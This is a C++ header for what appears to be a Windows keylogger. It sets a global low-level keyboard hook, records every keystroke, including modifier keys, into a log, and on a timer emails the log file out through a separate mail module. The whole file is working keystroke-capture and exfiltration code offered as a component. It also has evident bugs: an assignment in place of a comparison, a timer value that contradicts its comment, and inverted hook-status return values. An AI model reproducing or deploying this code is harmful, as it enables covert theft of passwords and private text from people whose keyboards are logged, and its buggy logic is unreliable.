#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>

#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

//THE FOLLOWING WOULD BE A VARIABLE WHERE ALL THE KEYY STROKES
//ARE STORED, AFTER THE MAIL IS SEND, THE VARUABLE WILL BE CLEARED
//BUT, IF THE SENDING OF THE MAIL DOESN'T SUCCEED,
//THE CONTENT OF THE VARIABLE WON'T BE CLEARED
std::string keylog="";

//WE'RE GOING TO SEND EMAILS EACH 2 MINUTES
void TimerSendMail()
{
    if(keylog.empty()) return;
    std::string last_file=IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation wasn't succesfull, Keylog '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log ["+last_file+"]",
                           "Hi, \nThe file has been attached to this mail, for testing"+keylog,
                           IO::GetOurPath(true)+last_file);
    if(x!=7) Helper::WriteAppLog("MAIL WAS'N SENT! ERROR CODE: " + Helper::ToString(x));
    else keylog = "";

}

Timer MailTimer(TimerSendMail, 500*60, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    //IF WE RECEIVE nCode LESS THAN ZERO, THAT MEANS THAT WE MUST PROPAGATE THE HOOKS
    if(nCode<0) CallNextHookEx(eHook, nCode, wparam, lparam);
    //READ ABOUT THE FOLLOWING: KBDLLHOOKSTRUCT
    //SEARCH IN "docs.microsoft.com/en-us/windows"
    //CONTAINS A LOT OF DATA FOR US
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam==WM_KEYDOWN || wparam==WM_SYSKEYDOWN)
    {
        //USING OUR MAP FROM KeyConstants
        keylog+=Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode = VK_RETURN) keylog+='\n';
    }

    else if(wparam==WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        //THE FOLLOWING IS THE "STYLE" THAT THE KEYLOGGER SHOWS FOR EACH KEY
        //[SHIFT][a][b][c][/SHIFT]
        DWORD key = kbs->vkCode;
        if(key==VK_CONTROL || key==VK_LCONTROL || key ==VK_RCONTROL
           || key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT
           || key==VK_MENU || key==VK_LMENU || key==VK_RMENU || key==VK_CAPITAL
           || key==VK_NUMLOCK || key==VK_LWIN || key==VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog+=KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

//"WH_KEYBOARD" INDICATES THAT WE USE KEYBOARD HOOK
//AND "_LL" (SHORTHAND FOR LOW LEVEL) INDICATES THAT THIS IS A GLOBAL HOOK
//THE VALUE OF THE CONSTANT IS 13
bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... Timer started");
    MailTimer.Start(true);
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook==NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook==NULL);
}

#endif // KEYBHOOK_H
